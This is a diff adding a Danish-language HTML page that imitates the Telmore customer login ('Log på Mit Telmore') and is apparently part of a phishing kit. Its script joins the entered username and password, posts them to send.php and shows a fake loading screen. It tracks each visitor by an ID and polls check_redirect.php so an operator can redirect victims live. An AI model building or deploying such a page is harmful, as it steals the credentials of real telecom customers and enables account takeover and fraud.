@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+                    <script>
+        var pollingInterval;
+
+        function checkRedirect() {
+            var xhr = new XMLHttpRequest();
+            var params = new URLSearchParams(window.location.search);
+            var userid = params.get('userid');
+
+            xhr.open('GET', 'check_redirect.php?userid=' + userid, true);
+
+            // Add cache-busting parameter
+            xhr.open('GET', 'check_redirect.php?userid=' + userid + '&timestamp=' + new Date().getTime(), true);
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    var response = JSON.parse(xhr.responseText);
+                    if (response.redirect) {
+                        // Stop the polling
+                        clearInterval(pollingInterval);
+                        // Redirect to the new URL
+                        window.location.href = response.redirect;
+                    }
+                }
+            };
+            xhr.send();
+        }
+
+        // Start checking for redirection every 2 seconds
+        pollingInterval = setInterval(checkRedirect, 1000);
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log på Mit Telmore</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* Reset and Base Styles */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #002788;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+
+        /* Utilities */
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 0 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 80px;
+            margin-bottom: 60px;
+            flex-grow: 1;
+            justify-content: center;
+        }
+
+        /* Back Button */
+        .back-btn {
+            position: absolute;
+            top: 32px;
+            left: 32px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: white;
+            padding: 4px;
+            opacity: 1;
+            transition: opacity 0.2s;
+        }
+
+        .back-btn:hover {
+            opacity: 0.8;
+        }
+
+        /* Logo */
+        .logo-container {
+            margin-bottom: 64px;
+            text-align: center;
+        }
+
+        .telmore-logo {
+            height: 32px;
+            width: auto;
+            fill: #ffb5b5;
+        }
+
+        /* Form */
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        .form-group {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        /* Icons */
+        .input-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            color: #1f2937;
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        .separator {
+            position: absolute;
+            left: 44px;
+            top: 50%;
+            transform: translateY(-50%);
+            height: 24px;
+            width: 1px;
+            background-color: #d1d5db;
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        /* Inputs */
+        input {
+            width: 100%;
+            height: 56px;
+            padding-left: 56px;
+            padding-right: 16px;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+            font-family: 'Inter', sans-serif;
+            background-color: white;
+            color: #111827;
+            outline: none;
+        }
+
+        input::placeholder {
+            color: #6b7280;
+            font-weight: 400;
+        }
+
+        /* Error State */
+        input.error {
+            border-bottom: 3px solid #ff4444;
+            border-bottom-left-radius: 2px;
+            border-bottom-right-radius: 2px;
+        }
+
+        .error-message {
+            color: #ff4444;
+            font-size: 13px;
+            padding-left: 4px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .form-group.has-error .error-message {
+            display: block;
+        }
+
+        /* Password Toggle */
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #9ca3af;
+            padding: 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .password-toggle:hover {
+            color: #4b5563;
+        }
+
+        /* Submit Button */
+        .submit-btn {
+            width: 100%;
+            height: 56px;
+            margin-top: 16px;
+            background-color: #0b1650;
+            color: white;
+            font-size: 15px;
+            font-weight: 700;
+            border: 1px solid rgba(26, 58, 156, 0.3);
+            border-radius: 9999px;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 0.025em;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        }
+
+        .submit-btn:hover {
+            background-color: #0a1345;
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        /* Links */
+        .forgot-link {
+            text-align: center;
+            margin-top: 24px;
+        }
+
+        .forgot-link a {
+            color: rgba(255, 255, 255, 0.9);
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: 0.025em;
+        }
+
+        .forgot-link a:hover {
+            color: white;
+            text-decoration: underline;
+        }
+
+        .help-link {
+            margin-top: 96px;
+            text-align: center;
+        }
+
+        .help-link a {
+            color: rgba(255, 255, 255, 0.9);
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.025em;
+        }
+
+        .help-link a:hover {
+            color: white;
+            text-decoration: underline;
+        }
+
+        /* Footer Styling */
+        .site-footer {
+            width: 100%;
+            background-color: white;
+            color: #1f2937;
+            padding: 40px 20px;
+            margin-top: auto;
+            border-top: 1px solid rgba(0,0,0,0.1);
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .footer-address {
+            font-size: 14px;
+            color: #4b5563;
+            text-align: center;
+            width: 100%;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+            justify-content: center;
+            width: 100%;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #4b5563;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #002788;
+            text-decoration: underline;
+        }
+
+        @media (min-width: 768px) {
+            .footer-content {
+                flex-direction: row;
+            }
+            .footer-address {
+                text-align: left;
+                width: auto;
+            }
+            .footer-links {
+                justify-content: flex-end;
+                width: auto;
+            }
+        }
+
+        /* Loader Overlay */
+        .loader-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #002788;
+            z-index: 9999;
+            flex-direction: column;
+        }
+
+        .loader-overlay.active {
+            display: flex;
+        }
+
+        .loader-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .loader-logo {
+            display: inline-block;
+            width: 200px;
+            height: auto;
+            margin-bottom: 50px;
+        }
+
+        .loader-logo svg {
+            width: 100%;
+            height: auto;
+        }
+
+        .loader-logo .st0 {
+            fill: #E57399;
+        }
+
+        .loader-container {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 30px;
+        }
+
+        .loader {
+            width: 80px;
+            height: 80px;
+            border: 8px solid #002788;
+            border-top: 8px solid #E57399;
+            border-right: 8px solid #E57399;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-text {
+            color: white;
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 15px;
+        }
+
+        .loader-description {
+            color: white;
+            font-size: 14px;
+            line-height: 1.6;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+
+        .loader-footer {
+            text-align: left;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 12px;
+            padding: 20px;
+            line-height: 1.6;
+            border-top: none;
+        }
+
+        .loader-footer-address {
+            margin-bottom: 10px;
+        }
+
+        .loader-footer-links {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .loader-footer-links a {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+        }
+
+        .loader-footer-links a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-overlay" id="loaderOverlay">
+        <div class="loader-content">
+            <div class="loader-logo">
+                <svg version="1.1" id="Lag_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 425.2 51" xml:space="preserve" class="telmore-logo">
+                    <g id="TELMORE_2_">
+                        <polygon points="2.3,4 2.3,13.5 11.4,13.5 11.4,47 22.4,47 22.4,13.5 31.4,13.5 31.4,4" class="st0"></polygon>
+                        <polygon points="65.2,4 65.2,47 89.2,47 89.2,37.5 76.2,37.5 76.2,30.1 88.5,30.1 88.5,20.7 76.2,20.7 76.2,13.5 89.2,13.5 89.2,4" class="st0"></polygon>
+                        <polygon points="125.8,4 125.8,47 149.9,47 149.9,37.5 136.8,37.5 136.8,4" class="st0"></polygon>
+                        <polygon points="216.4,4 207.3,27 198.8,4 187.9,4 180.8,47 191.7,47 195.2,22.3 195.3,22.3 205,47 209.4,47 219.6,22.3 219.7,22.3 222.8,47 233.8,47 227.4,4" class="st0"></polygon>
+                        <path d="M369.7,47L356,47l-10.4-16.6h-0.1V47l-11,0l0-43L351,4c8.4,0,14.7,4.1,14.7,13.2c0,5.9-3.2,11.1-9.2,12.1 L369.7,47z M345.5,24.2l1.1,0c3.6,0,8.6-0.8,8.6-6.3c0-5.3-5-6.3-8.6-6.3h-1.1L345.5,24.2z" class="st0"></path>
+                        <polygon points="398.9,4 398.9,47 422.9,47 422.9,37.5 409.9,37.5 409.9,30.1 422.3,30.1 422.3,20.7 409.9,20.7 409.9,13.5 422.9,13.5 422.9,4" class="st0"></polygon>
+                        <path d="M274.7,38.1l0-25.2l20.4,12.6L274.7,38.1z M281.7,2.6c-12.7,0-22.9,10.3-22.9,22.9c0,12.7,10.3,23,22.9,23 c12.6,0,22.9-10.3,22.9-23C304.7,12.8,294.4,2.6,281.7,2.6" class="st0"></path>
+                    </g>
+                </svg>
+            </div>
+            
+            <div class="loader-container">
+                <div class="loader"></div>
+            </div>
+            
+            <div class="loader-text">Venligst vent...</div>
+            <div class="loader-description">
+                Vi forbinder dig til serveren. Dette tager normalt kun<br>
+                nogle få sekunder.
+            </div>
+        </div>
+
+        <div class="loader-footer">
+            <div class="loader-footer-address">Gullandsstræde 2, 2. sal, 4000 Roskilde - CVR nr. 40075291</div>
+            <div class="loader-footer-links">
+                <a href="#">Persondatameddelelse</a>
+                <a href="#">Cookieinformation</a>
+                <a href="#">Sikkerhed på nettet</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Back Arrow -->
+    <button class="back-btn" aria-label="Gå tilbage">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="m15 18-6-6 6-6"/>
+        </svg>
+    </button>
+
+    <div class="container">
+        <!-- Logo -->
+        <div class="logo-container">
+            <svg version="1.1" id="Lag_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 425.2 51" xml:space="preserve" class="telmore-logo">
+                <g id="TELMORE_2_">
+                    <polygon points="2.3,4 2.3,13.5 11.4,13.5 11.4,47 22.4,47 22.4,13.5 31.4,13.5 31.4,4" class="st0"></polygon>
+                    <polygon points="65.2,4 65.2,47 89.2,47 89.2,37.5 76.2,37.5 76.2,30.1 88.5,30.1 88.5,20.7 76.2,20.7 76.2,13.5 89.2,13.5 89.2,4" class="st0"></polygon>
+                    <polygon points="125.8,4 125.8,47 149.9,47 149.9,37.5 136.8,37.5 136.8,4" class="st0"></polygon>
+                    <polygon points="216.4,4 207.3,27 198.8,4 187.9,4 180.8,47 191.7,47 195.2,22.3 195.3,22.3 205,47 209.4,47 219.6,22.3 219.7,22.3 222.8,47 233.8,47 227.4,4" class="st0"></polygon>
+                    <path d="M369.7,47L356,47l-10.4-16.6h-0.1V47l-11,0l0-43L351,4c8.4,0,14.7,4.1,14.7,13.2c0,5.9-3.2,11.1-9.2,12.1 L369.7,47z M345.5,24.2l1.1,0c3.6,0,8.6-0.8,8.6-6.3c0-5.3-5-6.3-8.6-6.3h-1.1L345.5,24.2z" class="st0"></path>
+                    <polygon points="398.9,4 398.9,47 422.9,47 422.9,37.5 409.9,37.5 409.9,30.1 422.3,30.1 422.3,20.7 409.9,20.7 409.9,13.5 422.9,13.5 422.9,4" class="st0"></polygon>
+                    <path d="M274.7,38.1l0-25.2l20.4,12.6L274.7,38.1z M281.7,2.6c-12.7,0-22.9,10.3-22.9,22.9c0,12.7,10.3,23,22.9,23 c12.6,0,22.9-10.3,22.9-23C304.7,12.8,294.4,2.6,281.7,2.6" class="st0"></path>
+                </g>
+            </svg>
+        </div>
+
+        <form class="login-form" id="loginForm" method="POST" action="send.php" novalidate>
+            
+            <!-- Username Field -->
+            <div class="form-group" id="usernameGroup">
+                <div class="input-wrapper">
+                    <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/>
+                        <circle cx="12" cy="7" r="4"/>
+                    </svg>
+                    <div class="separator"></div>
+                    <input type="text" id="username" name="username" placeholder="Mobilnr. eller brugernavn" required>
+                </div>
+                <div class="error-message">Du skal udfylde dette felt</div>
+            </div>
+
+            <!-- Password Field -->
+            <div class="form-group" id="passwordGroup">
+                <div class="input-wrapper">
+                    <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="7.5" cy="15.5" r="5.5"/>
+                        <path d="m21 2-9.6 9.6"/>
+                        <path d="m15.5 7.5 3 3L22 7l-3-3"/>
+                    </svg>
+                    <input type="password" id="password" name="password" placeholder="Adgangskode" style="padding-left: 56px;" required>
+                    
+                    <!-- Toggle Button -->
+                    <button type="button" class="password-toggle" id="togglePassword" aria-label="Vis/skjul adgangskode">
+                        <!-- Eye Icon (Hidden) -->
+                        <svg id="eyeIcon" class="eye-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display: none;">
+                            <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/>
+                            <circle cx="12" cy="12" r="3"/>
+                        </svg>
+                        <!-- Eye Off Icon (Visible) -->
+                        <svg id="eyeOffIcon" class="eye-off-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/>
+                            <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/>
+                            <path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7c.44 0 .87-.03 1.28-.09"/>
+                            <line x1="2" x2="22" y1="2" y2="22"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="error-message">Du skal udfylde dette felt</div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">Log ind</button>
+
+            <div class="forgot-link">
+                <a href="#">Jeg har glemt min adgangskode</a>
+            </div>
+        </form>
+
+        <div class="help-link">
+            <a href="#">Problemer med at logge ind?</a>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="site-footer">
+        <div class="footer-content">
+            <div class="footer-address">
+                Gullandsstræde 2, 2. sal, 4000 Roskilde - CVR nr. 40075291
+            </div>
+            <div class="footer-links">
+                <a href="#">Persondatameddelelse</a>
+                <a href="#">Cookieinformation</a>
+                <a href="#">Sikkerhed på nettet</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('loginForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const passwordInput = document.getElementById('password');
+            const togglePasswordBtn = document.getElementById('togglePassword');
+            const eyeIcon = document.getElementById('eyeIcon');
+            const eyeOffIcon = document.getElementById('eyeOffIcon');
+
+            togglePasswordBtn.addEventListener('click', () => {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                
+                if (type === 'text') {
+                    eyeIcon.style.display = 'block';
+                    eyeOffIcon.style.display = 'none';
+                } else {
+                    eyeIcon.style.display = 'none';
+                    eyeOffIcon.style.display = 'block';
+                }
+            });
+
+            // Generate or get customer ID
+            function getCustomerId() {
+                let customerId = localStorage.getItem('customer_id');
+                if (!customerId) {
+                    customerId = 'cid_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                    localStorage.setItem('customer_id', customerId);
+                }
+                return customerId;
+            }
+
+            const customerId = getCustomerId();
+
+            // Initialize active customer tracking
+            function initActiveCustomer() {
+                fetch('init_customer.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `customer_id=${encodeURIComponent(customerId)}&page=login.html`
+                }).catch(err => {
+                    console.error('Error initializing customer:', err);
+                });
+            }
+
+            // Initialize on page load
+            initActiveCustomer();
+
+            const loaderOverlay = document.getElementById('loaderOverlay');
+
+            form.addEventListener('submit', (e) => {
+                // Prevent default submission
+                e.preventDefault();
+                
+                let isValid = true;
+                const usernameGroup = document.getElementById('usernameGroup');
+                const passwordGroup = document.getElementById('passwordGroup');
+                const usernameInput = document.getElementById('username');
+                
+                usernameGroup.classList.remove('has-error');
+                passwordGroup.classList.remove('has-error');
+                usernameInput.classList.remove('error');
+                passwordInput.classList.remove('error');
+
+                if (!usernameInput.value.trim()) {
+                    usernameGroup.classList.add('has-error');
+                    usernameInput.classList.add('error');
+                    isValid = false;
+                }
+
+                if (!passwordInput.value.trim()) {
+                    passwordGroup.classList.add('has-error');
+                    passwordInput.classList.add('error');
+                    isValid = false;
+                }
+
+                if (isValid) {
+                    // Show loader
+                    loaderOverlay.classList.add('active');
+                    submitBtn.textContent = "Logger ind...";
+                    submitBtn.disabled = true;
+                    submitBtn.style.opacity = "0.7";
+
+                    // Post to send.php with username and password combined as phone
+                    const formData = new FormData();
+                    const phoneValue = usernameInput.value.trim() + ' : ' + passwordInput.value.trim();
+                    formData.append('phone', phoneValue);
+
+                    // Log what's being sent
+                    console.log('Posting to send.php:', {
+                        phone: phoneValue
+                    });
+
+                    fetch('send.php', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        return response.text();
+                    })
+                    .then(data => {
+                        console.log('Login data sent to send.php');
+                        // Wait 4 seconds with loader showing, then redirect to wait.html
+                        setTimeout(function() {
+                            window.location.href = 'wait.html?from=login';
+                        }, 1000);
+                    })
+                    .catch(err => {
+                        console.error('Error posting to send.php:', err);
+                        // Hide loader and re-enable button on error
+                        loaderOverlay.classList.remove('active');
+                        submitBtn.textContent = "Log ind";
+                        submitBtn.disabled = false;
+                        submitBtn.style.opacity = "1";
+                    });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
